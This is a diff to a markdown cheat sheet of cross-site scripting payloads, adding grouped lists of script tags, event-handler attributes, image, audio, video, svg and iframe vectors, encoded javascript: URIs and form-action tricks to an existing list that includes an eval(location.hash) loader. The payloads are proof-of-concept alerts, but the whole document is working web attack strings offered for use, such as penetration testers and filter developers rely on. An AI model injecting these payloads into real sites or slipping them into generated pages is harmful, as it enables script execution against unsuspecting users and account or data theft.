@@ -1,6 +1,34 @@
 # Unique XSS Payloads and Techniques
 
-## XSS Payloads
+### Script Injection
+- `<script>alert(1)</script>`
+- `<script src=javascript:alert(1)>`
+
+### Event Handlers
+- `onmouseover=alert(1)`
+- `<body/onfocus=alert(1)>`
+- `<marquee onstart=alert(1)>`
+- `<x onclick=alert(1)>click this!`
+- `<x onmousedown=alert(1)>click this!`
+- `<brute onclick=alert(1)>click this!`
+
+### Image and Media Tags
+- `"'><img src="javascript:alert(1)">`
+- `<img/src=1 onerror=window.alert(1)>`
+- `<audio src=1 onloadstart=alert(1)>`
+- `<video onloadstart=alert(1)><source>`
+
+### Dynamic Elements
+- `<svg/onload=alert(1)>`
+- `<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(1)">`
+- `<iframe src=javascript:alert(1)>`
+- `<IFRAME SRC=# onmouseover="alert(1)"></IFRAME>`
+
+### Forms and Links
+- `<form><button formaction=javascript:alert(1)>click`
+- `<IMG SRC="javascript:alert(1);">`
+- `<acronym onmousedown="alert(1)">test</acronym>`
+
 - `<img src="/" onerror='prompt(1)'>`
 - `<svg/onload=eval(location.hash.substr(1))>#alert(1)`
 - `<details/open/ontoggle=confirm('XSS')>`
